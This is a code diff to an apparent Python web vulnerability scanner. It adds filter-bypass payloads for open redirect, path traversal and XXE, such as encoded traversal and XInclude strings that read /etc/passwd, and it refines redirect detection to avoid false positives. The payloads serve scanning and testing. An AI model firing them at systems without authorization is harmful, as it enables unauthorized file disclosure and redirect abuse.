@@ -36,12 +36,22 @@ _CANARY = "easyhunt-canary.invalid"
 
 #: One class -> payloads + where the signature shows up + the finding shape.
 #: ``safe`` controls URL-quoting: open-redirect/CRLF/XXE encode everything so the
-#: server decodes the full value; LFI keeps ``/`` literal so traversal survives.
+#: server decodes the full value; LFI keeps ``/`` literal so traversal survives
+#: and ``%`` so single/double-encoded traversal arrives on the wire as the
+#: filter-bypass form rather than a second encoding.
 _CLASSES: dict[str, dict[str, Any]] = {
     "open-redirect": {
+        # The plain forms, plus the filter bypasses: a leading slash + encoded
+        # slashes defeats a filter that strips one ``/`` prefix; encoded scheme
+        # separators defeat a scheme regex applied before decoding; the triple
+        # slash defeats a "starts with //" string check while browsers still
+        # normalise ``///host`` to ``//host``.
         "payloads": [
             f"https://{_CANARY}/redirect",
             f"//{_CANARY}/redirect",
+            f"/%2F%2F{_CANARY}/redirect",
+            f"https:%2F%2F{_CANARY}/redirect",
+            f"///{_CANARY}/redirect",
         ],
         "safe": "",
         "where": "location",
@@ -81,12 +91,19 @@ _CLASSES: dict[str, dict[str, Any]] = {
         ),
     },
     "lfi": {
+        # The plain forms plus the filter bypasses: single-encoded ``%2f``
+        # traversal defeats a filter that blocks the literal ``../`` string
+        # (the server decodes once, then traverses); double-encoded defeats a
+        # filter that blocks both ``../`` and ``..%2f`` (two decode passes);
+        # the ``....//`` form defeats a ``../``-after-normalisation check.
         "payloads": [
             "../../../../etc/passwd",
             "....//....//....//etc/passwd",
             "/etc/passwd",
+            "..%2f..%2f..%2f..%2fetc/passwd",
+            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
         ],
-        "safe": "/",
+        "safe": "/%",
         "where": "body",
         "signature": re.compile(r"root:.*:0:0:"),
         "follow": True,
@@ -103,9 +120,20 @@ _CLASSES: dict[str, dict[str, Any]] = {
         ),
     },
     "xxe": {
+        # The plain DTD entity, plus the three filter bypasses that matter in
+        # the wild: XInclude (no DOCTYPE at all — defeats a "block DOCTYPE"
+        # filter), a parameter entity (fires where general entities are
+        # disabled), and a character-encoded ``&#x66;ile:`` SYSTEM target
+        # (defeats a filter blocking the literal ``file://`` string before
+        # parsing). All three read the same /etc/passwd proof.
         "payloads": [
             '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
             '"file:///etc/passwd">]><r>&xxe;</r>',
+            '<r xmlns:xi="http://www.w3.org/2001/XInclude">'
+            '<xi:include parse="text" href="file:///etc/passwd"/></r>',
+            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM '
+            '"file:///etc/passwd"> %p;]>',
+            '<!DOCTYPE r [<!ENTITY xxe SYSTEM "&#x66;ile:///etc/passwd">]><r>&xxe;</r>',
         ],
         "safe": "",
         "where": "body",
@@ -173,14 +201,57 @@ def _inject(url: str, parameter: str, payload: str, safe: str, duplicate: bool =
     return url.replace(parsed.query, urlencode(pairs, quote_via=quote, safe=safe))
 
 
+#: The canary as an actual off-host destination — ``https://…`` or ``//…``
+#: literally in the text. The percent-encoded echo inside a canonical redirect
+#: (``https%3A%2F%2Feasyhunt-canary.invalid…``) must not match: it is a URL
+#: echoed inside another URL, not a redirect destination.
+_OFF_HOST_CANARY = re.compile(r"(?:https?:)?//" + re.escape(_CANARY))
+
+
+def _redirects_to_canary(location: str) -> bool:
+    """True when a Location header's *destination host* is the canary.
+
+    An absolute Location that merely contains the canary is not a redirect to
+    it. ``Location: http://www.victim.example/api?id=easyhunt-canary.invalid``
+    lands the victim on ``victim.example`` — the canary was echoed into the
+    query string of the site's own canonical URL, exactly what Next.js 308s
+    and nginx ``http->https`` scheme rewrites do. Only when the parsed
+    destination hostname *is* the canary (``https://easyhunt-canary.invalid/…``,
+    ``//easyhunt-canary.invalid/…``, and the ``///host`` form browsers
+    normalise to ``//host``) can the victim actually be sent off-host.
+    """
+    if not location:
+        return False
+    try:
+        parsed = urlsplit(location)
+    except ValueError:
+        return False
+    if parsed.hostname and parsed.hostname.lower() == _CANARY:
+        return True
+    # ``///easyhunt-canary.invalid/…`` parses with no hostname but browsers
+    # still normalise it to ``//host``; lstrip makes the check match what the
+    # browser will do.
+    stripped = location.lstrip("/")
+    return stripped == _CANARY or stripped.startswith(_CANARY + "/")
+
+
 def _signature_hit(response: httpx.Response, where: str, signature: re.Pattern[str]) -> bool:
     if where == "headers":
         return any(signature.search(name) for name in response.headers)
     if where == "location":
         location = response.headers.get("location", "")
-        if signature.search(location):
+        # The canary must be the redirect *destination*, not a value echoed
+        # inside one. Next.js canonical redirects (``Location: /api?id=<injected>``)
+        # and nginx scheme rewrites (``Location: http://www.victim.example/
+        # path?id=<injected>``) both hit the loose check; without the
+        # destination-host guard every canonical redirect becomes a false
+        # open-redirect finding.
+        if _redirects_to_canary(location):
             return True
-        return signature.search(response.text[:8000]) is not None
+        # Body fallback: a client-side redirect or a reflected destination, but
+        # only when the canary appears as an off-host URL. The percent-encoded
+        # echo inside a canonical redirect's own Location/body is not one.
+        return _OFF_HOST_CANARY.search(response.text[:8000]) is not None
     return signature.search(response.text[:16000]) is not None
 
 
